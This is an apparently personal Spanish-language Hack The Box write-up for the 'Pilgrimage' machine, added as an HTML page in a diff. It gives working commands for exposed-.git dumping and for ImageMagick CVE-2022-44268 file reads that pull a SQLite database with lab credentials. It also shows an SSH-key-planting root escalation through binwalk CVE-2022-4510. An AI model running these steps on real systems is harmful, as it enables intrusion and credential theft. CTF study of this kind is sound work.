@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Pilgrimage HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/pilgrimage/pasted-20260415020518.png" alt="Pilgrimage HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Pilgrimage</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>git-dumper</span>
+            <span>magick</span>
+            <span>codigo</span>
+            <span>imagen</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web de subida de imágenes con repositorio <code>.git</code> expuesto</li>
+            <li><code>Explotación</code>: ImageMagick vulnerable permite leer ficheros locales y extraer la base de datos SQLite</li>
+            <li><code>Movimiento lateral</code>: Credenciales de la base de datos reutilizadas para acceder por SSH como <code>emily</code></li>
+            <li><code>Escalada de Privilegios</code>: Proceso root ejecuta binwalk vulnerable sobre ficheros controlados por el usuario</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415020738.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Dumpear .repositorio Git</h3>
+            <pre><code>git-dumper http://pilgrimage.htb//.git/ git_loot
+# Enumerar index.php</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ruta Base de datos</h3>
+            <pre><code># /var/db/pilgrimage</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415125040.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Interpretar Código</h3>
+            <pre><code># Parece que la web recibe fotos y le aplica el comando magick convert para tratar la imagen</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415025022.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>CVE</h3>
+            <pre><code>CVE-2022-44268</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415025140.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415030312.png" alt="Pilgrimage HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Web</h2>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415025050.png" alt="Pilgrimage HTB" />
+          <p><a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC/blob/main/README.md">PoC Exploit</a></p>
+          <div class="code-card">
+            <h3>Explotar conversión de imagen</h3>
+            <pre><code># 1. Descargar imagen png
+# 2. Editar metadatos imagen
+pngcrush -text a "profile" "/etc/passwd" cr7.png
+# 3. Subir imagen png_out.png que se crea
+# 4. Subir png_out.png y descargar una vez tratada en web
+# 5. Leer metadatos
+identify -verbose cr7_image.png
+# 6. Desencriptar Hex
+identify -verbose cr7_image.png | sed -n '/Raw profile/,/signature/p'  | head -n -2 | tail -n +4 | tr -d '\n'| xxd -p -r</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415123349.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415123738.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415123714.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415123702.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Extraer BD</h3>
+            <pre><code>pngcrush -text a "profile" "/var/db/pilgrimage" cr7.png
+identify -verbose img.png | sed -n '/Raw profile/,/signature/p'  | head -n -2 | tail -n +4 | tr -d '\n'| xxd -p -r &gt; bd</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415125507.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Enumerar BD</h3>
+            <pre><code>sqlite3 db
+.tables
+select * from users;
+# Credenciales -&gt; emily:abigchonkyboi123</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415125732.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Acceso SSH</h3>
+            <pre><code>ssh emily@10.129.20.219
+# Password: abigchonkyboi123</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415125923.png" alt="Pilgrimage HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Enumerar Procesos</h3>
+            <pre><code>ps -eo user,command</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415130530.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Analizar Código</h3>
+            <pre><code>cat /usr/sbin/malwarescan.sh
+# Usa binwalks para ejecutarlo sobre un filename del cual tenemos control ya que la ruta donde se almacena tiene permisos de escritura </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415135126.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415132056.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415135004.png" alt="Pilgrimage HTB" />
+          <p><a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath">Exploit</a></p>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415142644.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Preparar exploit</h3>
+            <pre><code># Crear como root en Kali par de claves ssh
+ssh-keygen
+python3 exploit.py ssh cr7.png id_ed25519.pub
+# Se crea la imagen binwalk_exploit.png maliciosa
+# Subir la imagen a la ruta donde se interpreta con binwalk</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415142814.png" alt="Pilgrimage HTB" />
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415142902.png" alt="Pilgrimage HTB" />
+          <div class="code-card">
+            <h3>Conectarnos via SSH con id_rsa</h3>
+            <pre><code>ssh -i /root/.ssh/id_ed25519 root@10.129.20.219</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pilgrimage/pasted-20260415142929.png" alt="Pilgrimage HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>git-dumper</span>
+            <span>magick</span>
+            <span>codigo</span>
+            <span>imagen</span>
+            <span>sqlite3</span>
+            <span>hex</span>
+            <span>xxd</span>
+            <span>lfi</span>
+            <span>binwalk</span>
+            <span>procesos</span>
+            <span>id_rsa</span>
+            <span>id_ed25519</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
